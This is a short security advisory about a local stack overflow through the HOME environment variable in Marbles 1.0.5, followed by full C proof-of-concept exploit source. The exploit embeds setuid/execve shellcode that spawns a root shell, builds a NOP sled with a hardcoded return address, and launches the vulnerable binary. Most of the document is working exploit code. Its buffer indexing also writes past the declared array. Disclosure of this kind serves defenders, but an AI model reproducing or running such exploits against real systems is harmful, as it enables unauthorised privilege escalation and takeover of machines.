source: http://www.securityfocus.com/bid/8710/info

A problem in the handling of data in the Home environment variable has been reported in the marbles program. This may make it possible for a local attacker to gain elevated privileges. 

/* c-marbles.c
 *
 * PoC exploit made for advisory based uppon an local stack based overflow.
 * Vulnerable versions, maybe also prior versions:
 *
 * Marbles v1.0.5
 *
 * Tested on:  Redhat 9.0
 *
 * Advisory source: Steve Kemp
 * http://www.debian.org/security/2003/dsa-390
 *
 * ---------------------------------------------
 * coded by: demz (c-code.net) (demz@c-code.net)
 * ---------------------------------------------
 *
 */

#include <stdio.h>
#include <stdlib.h>

char shellcode[]=

        "\x31\xc0"                      // xor          eax, eax
        "\x31\xdb"                      // xor          ebx, ebx
        "\x31\xc9"                      // xor          ecx, ecx
        "\xb0\x46"                      // mov          al, 70
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\x50"                          // push         eax
        "\x68\x6e\x2f\x73\x68"          // push  long   0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // push  long   0x69622f2f
        "\x89\xe3"                      // mov          ebx, esp
        "\x50"                          // push         eax
        "\x53"                          // push         ebx
        "\x89\xe1"                      // mov          ecx, esp
        "\x99"                          // cdq
        "\xb0\x0b"                      // mov          al, 11
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\xb0\x01"                      // mov          al, 1
        "\xcd\x80";                     // int          0x80

int main()
{
        unsigned long ret = 0xbffff70c;

        char buffer[3988];
        int i=0;

        memset(buffer, 0x90, sizeof(buffer));

        for (0; i < strlen(shellcode) - 1;i++)
        buffer[2000 + i] = shellcode[i];

        buffer[3988] = (ret & 0x000000ff);
        buffer[3989] = (ret & 0x0000ff00) >> 8;
        buffer[3990] = (ret & 0x00ff0000) >> 16;
        buffer[3991] = (ret & 0xff000000) >> 24;
        buffer[3992] = 0x0;

        printf("\nMarbles v1.0.5 local exploit\n");
        printf("---------------------------------------- demz @ c-code.net --\n");

        setenv("HOME", buffer, 1);

        execl("/usr/local/bin/marbles", "marbles", NULL);
}
